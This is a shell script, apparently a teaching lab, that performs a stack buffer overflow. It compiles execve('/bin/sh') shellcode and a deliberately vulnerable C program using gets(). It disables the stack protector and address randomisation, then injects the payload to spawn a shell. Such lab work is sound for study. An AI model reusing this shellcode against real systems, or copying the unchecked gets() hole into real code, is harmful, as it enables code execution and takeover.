
# Create tmp directory
origdir=`pwd`
tmpdir=`mktemp -d`
cd $tmpdir

# Create the shellcode and compile it
cat > shell.c << "EOF"
int main(int argc, char **argv) {
  asm("\
needle0: jmp there\n\
here: pop %rdi\n\
xor %rax, %rax\n\
movb $0x3b, %al\n\
xor %rsi, %rsi\n\
xor %rdx, %rdx\n\
syscall\n\
there: call here\n\
.string \"/bin/sh\"\n\
needle1: .octa 0xdeadbeef\n\
  ");
}
EOF
gcc -o shell shell.c

# Extracting into shellcode
addr=0x`objdump -d shell | grep needle0 | cut -c-16 | tail -c 4`

xxd -s$addr -l32 -p shell > shellcode

# Creating victim program
cat > victim.c << "EOF"
#include <stdio.h>
int main() {
  char name[64];
  printf("%p\n", name);  // Print address of buffer.
  puts("What's your name?");
  gets(name);
  printf("Hello, %s!\n", name);
  return 0;
}
EOF

# Compiling victim program and removing protections

gcc -fno-stack-protector -o victim victim.c

execstack -s victim

# Get address of beginning of buffer

addr=$(echo | setarch $(arch) -R ./victim | sed 1q)

# Change address to little endian

a=`printf %016x $addr | tac -rs..`

# Pull off the attack. 

((cat shellcode; printf %080d 0; echo $a) | xxd -r -p; cat) | setarch x86_64 -R ./victim

# Remove the temp directory

cd $origdir
rm -r $tmpdir

